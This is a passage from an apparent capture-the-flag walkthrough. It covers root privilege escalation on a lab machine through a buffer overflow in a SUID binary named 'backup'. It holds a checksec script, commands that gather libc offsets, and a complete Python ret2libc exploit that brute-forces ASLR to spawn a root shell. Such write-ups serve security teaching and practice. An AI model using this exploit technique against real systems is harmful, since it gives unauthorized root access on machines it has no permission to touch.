And this does cause a crash. Now that the overflow offsets are finalized, check for shellcode execution with the following Bash function `checksec`:

- Pulled from `checksec.sh`: https://www.trapkit.de/tools/checksec.html
- https://bitvijays.github.io/LFC-BinaryExploitation.html

```bash
function checksec() {
  # check for RELRO support
  if readelf -l $1 2>/dev/null | grep -q 'GNU_RELRO'; then
    if readelf -d $1 2>/dev/null | grep -q 'BIND_NOW'; then
      echo -e '\033[32mFull RELRO\033[m'
    else
      echo -e '\033[33mPartial RELRO\033[m'
    fi
  else
    echo -e '\033[31mNo RELRO\033[m'
  fi
  # check for stack canary support
  if readelf -s $1 2>/dev/null | grep -q '__stack_chk_fail'; then
    echo -e '\033[32mStack canary found\033[m'
  else
    echo -e '\033[31mNo stack canary found\033[m'
  fi
  # check for NX support
  if readelf -W -l $1 2>/dev/null | grep 'GNU_STACK' | grep -q 'RWE'; then
    echo -e '\033[31mNX disabled\033[m'
  else
    echo -e '\033[32mNX enabled\033[m'
  fi 
  # check for PIE support
  if readelf -h $1 2>/dev/null | grep -q 'Type:[[:space:]]*EXEC'; then
    echo -e '\033[31mNo PIE\033[m'
  elif readelf -h $1 2>/dev/null | grep -q 'Type:[[:space:]]*DYN'; then
    if readelf -d $1 2>/dev/null | grep -q '(DEBUG)'; then
      echo -e '\033[32mPIE enabled\033[m'
    else   
      echo -e '\033[33mDSO\033[m'
    fi
  else
    echo -e '\033[33mNot an ELF file\033[m'
  fi 
  # check for run path
  if readelf -d $1 2>/dev/null | grep -q 'rpath'; then
   echo -e '\033[31mRPATH set\033[m'
  else
   echo -e '\033[32mNo RPATH set\033[m'
  fi
  if readelf -d $1 2>/dev/null | grep -q 'runpath'; then
   echo -e '\033[31mRUNPATH set\033[m'
  else
   echo -e '\033[32mNo RUNPATH set\033[m'
  fi
}
```

Running this on the binary `backup` shows the following:

![root5](./node/root5.png)

So NX being enabled means there is no code execution on the stack... Since PIE is disabled, there is no need to try and bypass ASLR. Next check if ASLR is enabled system-wide on the target:

- https://linux-audit.com/linux-aslr-and-kernelrandomize_va_space-setting/
- https://docs.oracle.com/html/E36387_02/ol_kernel_sec.html

```bash
cat /proc/sys/kernel/randomize_va_space
```

![root7](./node/root7.png)

So ASLR is enabled system-wide on the target. This means the exploit will need to be run multiple times to try and get a valid execution. From here, the simplest option here is to try and find a ROP gadget that returns to libc to spawn a shell like the following C code:

```c
exit(system("/bin/sh"));
```

Get the addresses needed:

```bash
# run the following on the target as tom
libc=$(ldd /usr/local/bin/backup | grep libc.so | sed 's/^[ \t]*//g' | cut -d ' ' -f 3)
echo $libc
ldd /usr/local/bin/backup
readelf -s $libc | grep system
readelf -s $libc | grep exit
strings -a -t x $libc | grep /bin/sh
```

![root6](./node/root6.png)

Here are the important notes from the above image:

- libc base is `0xf77b1000` when loaded into `/usr/local/bin/backup` 
- libc offset for the function `system()` is `0x0003a940`
- libc offset for the function `exit()` is `0x0002e7b0`
- libc offset for the string `/bin/sh` is `0x15900b`

**NOTE** all of the above offsets are only valid at the time of running the binary. Since ASLR is enabled system-wide, this will need to be bypassed by using these offsets and running the binary untilt he offsets become valid. Convert this into the following Python:

```python
import struct
import subprocess

# offsets of system, exit and /bin/sh
libc_base_addr = 0xf77b1000
system_offset  = 0x0003a940
exit_offset    = 0x0002e7b0
binsh_offset   = 0x0015900b

# calculate offsets
system_addr = struct.pack("<I", libc_base_addr + system_offset)
exit_addr   = struct.pack("<I", libc_base_addr + exit_offset)
binsh_addr  = struct.pack("<I", libc_base_addr + binsh_offset)

# create the payload
buf  = (b'A' * 508) # buffer
buf += (b'B' * 4)   # ebp
buf += system_addr  # eip
buf += exit_addr    # eip for system() return
buf += binsh_addr   # arg for system()

# try to bypass ASLR
attempts = 0
while True:
  attempts += 1
  print('[*] attempt: ' + str(attempts))
  subprocess.call([
    '/usr/local/bin/backup',
    'bubba',
    '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474',
    buf
  ])
```

Run this on the target as `tom` as follows:

```bash
python3 exploit.py
```

Eventually it should pop a shell as `root`, but mine took forever...